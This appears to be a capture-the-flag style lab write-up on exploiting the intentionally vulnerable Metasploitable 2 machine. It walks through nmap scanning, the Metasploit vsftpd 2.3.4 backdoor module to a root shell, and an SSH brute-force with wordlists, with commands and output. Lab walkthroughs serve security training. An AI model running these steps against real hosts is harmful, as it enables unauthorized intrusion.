# Metasploitable 2
### Solved using Metasploit 

Ping Scan

```
sudo nmap -sn -oN host_discovery.txt 192.168.69.0/24
```

Host Discovery File

```
sudo nmap -sn -oN host_discovery.txt 192.168.69.0/24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-26 06:06 CDT
Nmap scan report for 192.168.69.1
Host is up (0.00013s latency).
MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)
Nmap scan report for 192.168.69.2
Host is up (0.00013s latency).
MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)
Nmap scan report for 192.168.69.3
Host is up (0.00011s latency).
MAC Address: 08:00:27:F7:8E:EB (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.69.12                      <<<<<<<<<<<<<<<<<<<<<<<<
Host is up (0.00020s latency).
MAC Address: 08:00:27:61:B8:11 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.69.5
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 2.06 seconds
```

we discovered the machine running on `192.168.69.23`

<img src="../img/Pasted image 20240626163707.png" alt="Example Image" width="1080"/>

Full Scan 

```
 sudo nmap -A -T4 -oN full_scan.txt 192.168.69.12
```

Full output was in the file called `fullscan.txt` , we got know ftp service running 

```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
```

search `vsftpd 2.3.4` exploit 

```
searchsploit vsftpd 2.3.4
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution                                          | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                             | unix/remote/17491.rb
----------------------------------------------------------------------------------- ---------------------------------
```

BCE ` unix/remote/17491.rb ` was in Metasploit , so search and use that  BCE 

```
msfconsole
msf6 > search vsftpd 2.3.4

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution

use 0
show options
RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    21               yes       The target port (TCP)

set rhosts 192.168.69.12 
set rport 21

show payloads
0  payload/cmd/unix/interact  .                normal  No     Unix Command, Interact with Established Connection
set payload payload/cmd/unix/interact

run
```

We got the shell , 

<img src="../img/Pasted image 20240626170725.png" alt="Example Image" width="1080"/>

we has been  pwned the machine and got root flag 
```
which python
/usr/bin/python
python -c 'import pty;pty.spawn("/bin/bash");'
root@metasploitable:/# cd root
cd root
root@metasploitable:/root# ls
ls
Desktop  reset_logs.sh  vnc.log

```

---

It also running a ssh try for brute force approach , using Metasploit `auxiliary/scanner/ssh/ssh_login 
`

```
msfconsole 
search ssh_login
msf6 > search ssh_login

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  auxiliary/scanner/ssh/ssh_login         .                normal  No     SSH Login Check Scanner

use 0

 show options

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   ANONYMOUS_LOGIN   false            yes       Attempt to login with a blank username and password
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   CreateSession     true             no        Create a new session for every successful login
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   DB_SKIP_EXISTING  none             no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   RHOSTS                             yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploi
                                                t.html
   RPORT             22               yes       The target port
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads (max one per host)
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           false            yes       Whether to print output for all attempts


set rhosts 192.168.69.12
set rport 22
set pass_file /usr/share/wordlists/rockyou.txt
set user_file /usr/share/wordlists/rockyou.txt
run
```

I made custom word list from multiple GitHub , repo 

```
user:user
msfadmin:msfadmin
```

we got the ssh credentials , then same procedure to got a root privilege 
